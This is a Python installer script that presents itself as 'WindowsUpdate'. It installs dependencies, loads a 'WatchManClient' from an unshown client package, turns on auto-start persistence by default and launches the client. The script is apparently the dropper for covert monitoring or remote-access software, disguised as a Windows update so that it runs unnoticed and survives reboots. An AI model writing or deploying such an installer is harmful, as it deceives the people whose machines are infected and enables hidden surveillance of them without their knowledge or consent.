#!/usr/bin/env python3
"""
Installer for WindowsUpdate
"""
import os
import sys
import subprocess
import json
import shutil
from pathlib import Path

def install_requirements():
    """Install Python requirements"""
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
        return True
    except subprocess.CalledProcessError as e:
        print(f"Error installing requirements: {e}")
        return False

def install_client():
    """Install client with persistence"""
    try:
        # Import and run client
        sys.path.insert(0, os.getcwd())
        from client.main import WatchManClient
        
        # Create client instance
        client = WatchManClient('client_config.json')
        
        # Install persistence
        if client.config.get('auto_startup', True):
            success = client.persistence_manager.install_persistence()
            if success:
                print("Persistence installed successfully")
            else:
                print("Warning: Could not install persistence")
        
        # Start client
        print("Starting WindowsUpdate...")
        client.run()
        
    except Exception as e:
        print(f"Error starting client: {e}")
        return False

def main():
    """Main installer function"""
    print("Installing WindowsUpdate...")
    
    # Install requirements
    print("Installing dependencies...")
    if not install_requirements():
        print("Failed to install dependencies")
        return False
    
    print("Dependencies installed successfully")
    
    # Install and start client
    print("Installing client...")
    install_client()

if __name__ == '__main__':
    main()
